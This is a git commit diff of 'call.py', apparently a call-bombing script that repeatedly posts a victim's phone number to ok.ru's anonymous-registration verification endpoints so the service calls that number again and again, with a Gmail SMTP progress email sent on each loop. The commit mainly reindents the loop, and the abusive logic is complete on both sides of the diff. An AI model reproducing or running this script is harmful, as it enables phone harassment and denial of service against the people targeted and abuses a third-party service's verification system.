adef796b5cf3b4818eb2f3b2e5951b7e2f287690
skes2197 <80992374+skes2197@users.noreply.github.com>
2021-05-24 10:25:12 +0100

    Update call.py

--- call.py
+++ call.py
@@ -7,23 +7,23 @@ print("How many?:")
 j = int(input())
 print("how many seconds?")
 k = int(input())
-
-
-payload = {'st.r.phone': i}
-payload2 = {'st.r.fieldAcceptCallUIButton': 'Call'}
 for v in range(j):
-  s = smtplib.SMTP('smtp.gmail.com', 587)
-  s.starttls()
-  s.login("skes2197@gmail.com", "payload2 = {'st.r.fieldAcceptCallUIButton': 'Call'}")
-  message = "calling " +"+"+str(i) + " pour la " + str(v+1) + "eme fois sur "+str(j)+" pour un laps de"+str(k)+" seconds"
-  s.sendmail("skes2197@gmail.com", "skes2197@gmail.com", message)
-  s.quit()
-  print("--------------")
-  s = requests.session()
-  response = s.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.starttls()
+    s.login("skes2197@gmail.com", "payload3 = {'st.r.fieldAcceptCallUIButton': 'Call'}")
+    message = "calling " +"+"+str(i) + " pour la " + str(v+1) + "eme fois sur "+str(j)+" pour un laps de"+str(k)+" seconds"
+    s.sendmail("hichamotivation@gmail.com", "skes2197@gmail.com", message)
+    s.quit()
+    print("--------------")
+
+    s = requests.session()
+    payload = {'st.r.phone': i}
+    response = s.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                       data=payload)
-  print(response.status_code)
-  response = s.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",
+    print(response.status_code)
+    payload2 = {'st.r.fieldAcceptCallUIButton': 'Call'}
+    response = s.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",
                       data=payload2)
-  print(response.status_code, response.reason, str(v+1)+"/"+str(j))
-  time.sleep(k)
+    print(response.status_code, response.reason, str(v+1)+"/"+str(j))
+    time.sleep(k)
+
